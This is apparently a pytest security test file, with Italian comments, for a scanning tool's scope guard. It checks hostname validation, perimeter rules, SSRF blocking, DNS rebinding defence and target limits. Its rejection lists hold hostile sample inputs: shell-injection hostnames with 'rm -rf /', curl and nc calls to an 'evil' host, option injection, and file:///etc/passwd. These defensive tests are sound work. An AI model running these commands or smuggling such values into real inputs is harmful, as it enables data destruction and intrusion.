"""Test delle protezioni di perimetro: SSRF, scope, DNS rebinding, injection."""
from __future__ import annotations

import pytest

from app.services.scope_guard import (
    ScopeEntry,
    ScopeGuard,
    ScopeViolation,
    is_cdn_or_cloud,
    normalize_hostname,
)

pytestmark = pytest.mark.security


# --------------------------------------------------------------------------
# Normalizzazione degli hostname
# --------------------------------------------------------------------------
@pytest.mark.parametrize("hostname", [
    "example.com", "www.example.com", "a-b.example.co.uk", "EXAMPLE.COM", "example.com.",
])
def test_hostname_validi(hostname):
    assert normalize_hostname(hostname)


@pytest.mark.parametrize("payload", [
    "example.com; rm -rf /",
    "example.com && curl http://evil",
    "example.com | nc evil 1234",
    "$(whoami).example.com",
    "`id`.example.com",
    "example.com\nHost: evil.com",
    "example .com",
    "exam\tple.com",
    "-oProxyCommand=evil",
    "--config=/etc/passwd",
    "example.com'",
    'example.com"',
    "a" * 300 + ".com",
    "",
])
def test_hostname_malevoli_rifiutati(payload):
    """Nessun metacarattere di shell o option injection puo' passare."""
    with pytest.raises(ScopeViolation):
        normalize_hostname(payload)


# --------------------------------------------------------------------------
# Perimetro
# --------------------------------------------------------------------------
def test_host_in_perimetro_ammesso(scope_guard):
    decision = scope_guard.check_hostname("www.acme-test.example")
    assert decision.allowed


def test_host_fuori_perimetro_negato(scope_guard):
    decision = scope_guard.check_hostname("concorrente.example")
    assert not decision.allowed
    assert "perimetro" in decision.reason


def test_esclusione_esplicita_prevale(scope_guard):
    """L'esclusione batte l'inclusione wildcard del dominio padre."""
    decision = scope_guard.check_hostname("vecchio.legacy.acme-test.example")
    assert not decision.allowed
    assert "escluso" in decision.reason


def test_default_deny():
    """Senza perimetro configurato nessun target e' ammesso."""
    guard = ScopeGuard([])
    assert not guard.check_hostname("example.com").allowed
    assert not guard.check_ip("8.8.8.8").allowed


# --------------------------------------------------------------------------
# Anti-SSRF
# --------------------------------------------------------------------------
@pytest.mark.parametrize("address", [
    "127.0.0.1", "127.1.2.3", "0.0.0.0", "10.0.0.1", "172.16.0.1", "192.168.1.1",
    "169.254.169.254", "169.254.170.2", "100.100.100.200",
    "::1", "fe80::1", "fc00::1",
])
def test_indirizzi_non_pubblici_negati(address):
    """Loopback, reti private, link-local e metadati cloud sono sempre negati."""
    guard = ScopeGuard([ScopeEntry("cidr", "0.0.0.0/0"), ScopeEntry("cidr", "::/0")])
    assert not guard.check_ip(address).allowed


def test_metadati_cloud_negati_anche_con_policy_permissiva():
    """L'endpoint di metadati resta negato anche abilitando le reti private."""
    from app.services.scope_guard import CLOUD_METADATA_ADDRESSES, _is_public_ip

    for address in CLOUD_METADATA_ADDRESSES:
        assert not _is_public_ip(address, allow_documentation=True)


@pytest.mark.parametrize("url", [
    "http://user:password@acme-test.example/",
    "https://admin:secret@acme-test.example/panel",
])
def test_url_con_credenziali_negati(scope_guard, url):
    decision = scope_guard.check_url(url)
    assert not decision.allowed
    assert "credenziali" in decision.reason


@pytest.mark.parametrize("url", [
    "file:///etc/passwd", "gopher://acme-test.example/", "ftp://acme-test.example/",
    "data:text/html,<script>", "jar:http://acme-test.example!/",
])
def test_schemi_non_http_negati(scope_guard, url):
    assert not scope_guard.check_url(url).allowed


def test_path_traversal_negato(scope_guard):
    decision = scope_guard.check_url("https://acme-test.example/../../etc/passwd")
    assert not decision.allowed
    assert "traversal" in decision.reason


def test_url_con_caratteri_di_controllo_negato(scope_guard):
    assert not scope_guard.check_url("https://acme-test.example/\r\nX-Evil: 1").allowed


def test_redirect_rivalutato(scope_guard):
    """Un redirect non estende il perimetro: ogni hop e' ricontrollato."""
    decision = scope_guard.check_redirect(
        "https://www.acme-test.example/", "https://evil.example/steal")
    assert not decision.allowed


def test_dns_rebinding_bloccato(monkeypatch):
    """Un host in perimetro che risolve verso indirizzi interni viene negato."""
    import app.services.scope_guard as module

    monkeypatch.setattr(module, "resolve_hostname", lambda _host: ["10.0.0.5"])
    guard = ScopeGuard([ScopeEntry("wildcard_domain", "*.acme-test.example")],
                       allow_private=False)
    decision = guard.check_hostname("interno.acme-test.example")
    assert not decision.allowed
    assert "non pubblici" in decision.reason


# --------------------------------------------------------------------------
# Non espansione automatica verso terzi
# --------------------------------------------------------------------------
@pytest.mark.parametrize("hostname", [
    "d1234.cloudfront.net", "acme.akamaiedge.net", "acme.fastly.net",
    "acme.azureedge.net", "bucket.s3.amazonaws.com", "acme.herokuapp.com",
    "acme.vercel.app", "acme-it.mail.protection.outlook.com", "acme.pphosted.com",
])
def test_provider_terzi_riconosciuti(hostname):
    assert is_cdn_or_cloud(hostname)


def test_dominio_aziendale_non_e_terza_parte():
    assert not is_cdn_or_cloud("www.acme-test.example")


# --------------------------------------------------------------------------
# Limiti e reportistica delle violazioni
# --------------------------------------------------------------------------
def test_filtro_target_scarta_i_non_autorizzati(scope_guard):
    allowed = scope_guard.filter_targets(
        ["www.acme-test.example", "evil.example", "api.acme-test.example",
         "vecchio.legacy.acme-test.example"], "hostname")
    assert allowed == ["api.acme-test.example", "www.acme-test.example"] or \
           sorted(allowed) == ["api.acme-test.example", "www.acme-test.example"]


def test_limite_massimo_di_target(scope_guard, monkeypatch):
    from app.core.config import settings

    monkeypatch.setattr(settings, "scan_max_targets", 5)
    targets = [f"host{i}.acme-test.example" for i in range(50)]
    assert len(scope_guard.filter_targets(targets, "hostname")) == 5


def test_violazioni_registrate(scope_guard):
    scope_guard.check_hostname("evil.example")
    scope_guard.check_url("http://user:pw@acme-test.example/")
    report = scope_guard.violation_report()
    assert len(report) >= 2
    assert all("reason" in entry and "target" in entry for entry in report)


def test_reti_di_documentazione_negate_in_produzione():
    """In esecuzione reale le reti RFC 5737 non sono instradabili: negate."""
    guard = ScopeGuard([ScopeEntry("cidr", "203.0.113.0/24")],
                       allow_documentation_ranges=False)
    assert not guard.check_ip("203.0.113.10").allowed
